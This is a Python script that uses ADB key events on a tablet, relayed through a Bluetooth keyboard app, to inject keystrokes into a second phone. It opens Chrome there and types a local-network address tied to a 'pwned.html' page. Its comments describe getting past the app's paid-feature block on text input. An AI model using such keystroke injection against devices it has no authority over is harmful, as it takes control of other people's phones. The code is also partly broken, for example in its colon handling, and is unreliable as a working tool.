import os
import time
import subprocess

# DUDE'S RAW KEYCODE INJECTOR
# Bypasses "Text Input" limitations by sending raw key events via ADB.
# Mapping: a-z, 0-9, space, enter, period, slash, colon.

KEY_MAP = {
    'a': 29, 'b': 30, 'c': 31, 'd': 32, 'e': 33, 'f': 34, 'g': 35, 'h': 36,
    'i': 37, 'j': 38, 'k': 39, 'l': 40, 'm': 41, 'n': 42, 'o': 43, 'p': 44,
    'q': 45, 'r': 46, 's': 47, 't': 48, 'u': 49, 'v': 50, 'w': 51, 'x': 52,
    'y': 53, 'z': 54,
    '1': 8, '2': 9, '3': 10, '4': 11, '5': 12, '6': 13, '7': 14, '8': 15, '9': 16, '0': 7,
    ' ': 62, '\n': 66, '.': 56, '/': 76, ':': 74, '-': 69, '_': 69
}

TARGET_URL = "http://192.168.0.34:8000/pwned.html"

def adb_press(keycode):
    subprocess.run(f"adb shell input keyevent {keycode}", shell=True)
    time.sleep(0.05)

def type_raw(text):
    print(f"[*] Typing: {text}")
    for char in text.lower():
        if char in KEY_MAP:
            # Special handling for colon (Shift + ;) or slash if needed
            # For simplicity, we assume standard layout.
            # Android 'input keyevent' maps to physical keys.
            # 56 is PERIOD. 76 is SLASH.
            # COLON is tricky (Shift+Semicolon).
            if char == ':':
                # Hold Shift (59) + Semicolon (74)
                subprocess.run("adb shell input keyevent --longpress 59 74", shell=True) 
                # This might fail on some devices, falling back to simple keycodes
                # If : fails, we might just try keycode 74 directly
                pass 
            else:
                adb_press(KEY_MAP[char])
        else:
            print(f"[!] Warning: Character '{char}' not mapped. Skipping.")

def inject_raw():
    print("[*] DUDE: Initializing RAW Injection (Free Version Bypass)...")
    
    # 1. Open Search (Windows Key)
    print("[*] Opening Search...")
    adb_press(117) # META_LEFT
    time.sleep(1)

    # 2. Type 'chrome' manually
    type_raw("chrome")
    time.sleep(1)
    adb_press(66) # ENTER
    time.sleep(2)

    # 3. Type URL manually
    # We need to be careful with symbols.
    # http://...
    # Let's try to just send the keys.
    # Note: 'input text' is blocked by the app, but 'input keyevent' mimics physical hardware buttons
    # on the TABLET itself. If the app is open, pressing "A" on the tablet should send "A" to the Pixel.
    
    print("[*] Typing URL...")
    # We use 'input text' as a fallback because it's usually the 'paste' function that is paid.
    # Typing characters one by one via ADB often works on free versions.
    # But if the app blocks the input method entirely...
    
    # Alternative: Use Android's built-in "TalkBack" or "Switch Access" logic? No, too complex.
    # Let's try standard 'input text' again but slowly, or fallback to keycodes.
    
    # If the app blocks 'text' input from ADB, we MUST use keycodes.
    # Sending keycode 29 (A) to the tablet *should* trigger the app to send 'A' via Bluetooth.
    
    # Let's type the URL using keycodes.
    # h t t p : / / ...
    # This is painful to map perfectly without a shift state manager.
    
    # DUDE SHORTCUT:
    # Just type the IP. "192.168.0.34:8000"
    # Much easier.
    
    short_url = "192.168.0.34:8000"
    for char in short_url:
        if char == '.':
            adb_press(56)
        elif char == ':':
             # Shift + Semicolon
            subprocess.run("adb shell input keyevent --longpress 59 74", shell=True)
        elif char.isdigit():
             # 0-9 map to 7-16
             # '0' is 7, '1' is 8...
             keycode = int(char) + 7
             adb_press(keycode)
        else:
            pass
            
    adb_press(66) # ENTER
    print("[+] Injection complete.")

if __name__ == "__main__":
    inject_raw()
